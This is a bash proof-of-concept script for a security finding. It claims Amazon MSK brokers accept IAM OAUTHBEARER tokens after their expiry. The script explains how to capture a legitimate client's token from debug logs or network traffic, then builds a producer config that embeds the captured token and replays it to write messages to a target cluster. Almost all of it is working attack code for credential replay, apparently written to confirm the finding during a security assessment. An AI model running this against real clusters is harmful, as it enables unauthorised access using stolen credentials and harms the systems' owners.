#!/usr/bin/env bash
# ============================================================
# FINDING-001 PoC: MSK IAM Token Replay Past TTL Expiry
# ============================================================
# Demonstrates that a captured MSK IAM OAUTHBEARER token can
# be replayed after its X-Amz-Expires window (default: 900s)
# because the MSK broker never performs server-side expiry check.
#
# Prerequisites:
#   - kafka-console-producer.sh (Kafka 3.x bin scripts)
#   - A captured MSK IAM token (base64url-encoded pre-signed URL)
#   - Network access to the MSK bootstrap broker on port 9098 (IAM/TLS)
#
# How to capture a legitimate token:
#   Enable DEBUG logging on a legitimate client:
#     -Dlog4j.logger.org.apache.kafka.common.security.oauthbearer=DEBUG
#   Look for the token value in the log output, or intercept the
#   SASL/OAUTHBEARER client-initial-response message at the wire level.
# ============================================================

set -euo pipefail

BOOTSTRAP_SERVER="${1:-b-1.CLUSTER-UUID.REGION.kafka.amazonaws.com:9098}"
CAPTURED_TOKEN="${2:-}"          # base64url-encoded pre-signed URL
TOPIC="${3:-test-replay}"

if [[ -z "$CAPTURED_TOKEN" ]]; then
  echo "[!] Usage: $0 <bootstrap-server> <captured-token> [topic]"
  echo "[!] Example token capture command (run on legitimate client):"
  echo "    export KAFKA_OPTS='-Dlog4j.logger.software.amazon.msk.auth.iam=TRACE'"
  echo "    kafka-console-producer.sh --bootstrap-server $BOOTSTRAP_SERVER \\"
  echo "      --producer.config /etc/kafka/client.properties --topic $TOPIC"
  echo "    # Grep logs for 'token=' or 'Generating token'"
  exit 1
fi

echo "[*] Target bootstrap: $BOOTSTRAP_SERVER"
echo "[*] Topic: $TOPIC"
echo "[*] Token (first 40 chars): ${CAPTURED_TOKEN:0:40}..."

# Decode the token to show its embedded expiry
DECODED_URL=$(echo "$CAPTURED_TOKEN" | base64 -d 2>/dev/null || \
              python3 -c "import base64, sys; print(base64.urlsafe_b64decode(sys.argv[1] + '==').decode())" "$CAPTURED_TOKEN")
echo "[*] Decoded pre-signed URL: $DECODED_URL"
echo "[*] Extracting X-Amz-Date and X-Amz-Expires from URL..."
AMZ_DATE=$(echo "$DECODED_URL" | grep -oP 'X-Amz-Date=\K[^&]+')
AMZ_EXPIRES=$(echo "$DECODED_URL" | grep -oP 'X-Amz-Expires=\K[^&]+')
echo "[*] Token signed at: $AMZ_DATE"
echo "[*] Token TTL (seconds): $AMZ_EXPIRES"
echo "[*] Token expired at: $(date -d "$AMZ_DATE + $AMZ_EXPIRES seconds" 2>/dev/null || echo 'N/A')"
echo "[*] Current time: $(date -u +%Y%m%dT%H%M%SZ)"

# Write a minimal producer.properties using the captured (expired) token
TMPDIR=$(mktemp -d)
cat > "$TMPDIR/replay.properties" <<EOF
security.protocol=SASL_SSL
sasl.mechanism=OAUTHBEARER
sasl.jaas.config=org.apache.kafka.common.security.oauthbearer.OAuthBearerLoginModule required \
  oauth.token.endpoint.uri="data:application/json,{\"access_token\":\"${CAPTURED_TOKEN}\"}";
sasl.login.callback.handler.class=software.amazon.msk.auth.iam.IAMOAuthBearerLoginCallbackHandler
EOF

echo ""
echo "[*] Attempting to produce with EXPIRED token..."
echo "[!] If the write succeeds, the broker accepted a token past its TTL — FINDING-001 confirmed."
echo ""

echo "replay-test-$(date +%s)" | \
  kafka-console-producer.sh \
    --bootstrap-server "$BOOTSTRAP_SERVER" \
    --producer.config "$TMPDIR/replay.properties" \
    --topic "$TOPIC" 2>&1 && \
  echo "[+] SUCCESS: Message produced with expired IAM token — broker did not validate TTL." || \
  echo "[-] FAILED: Broker rejected the token (may be patched, or token format issue)."

rm -rf "$TMPDIR"

# ============================================================
# EXPECTED OUTPUT (vulnerable broker):
#   [+] SUCCESS: Message produced with expired IAM token — broker did not validate TTL.
#
# EXPECTED OUTPUT (patched broker):
#   [org.apache.kafka.clients.NetworkClient] - ...Authentication failed...
#   [-] FAILED: Broker rejected the token
# ============================================================
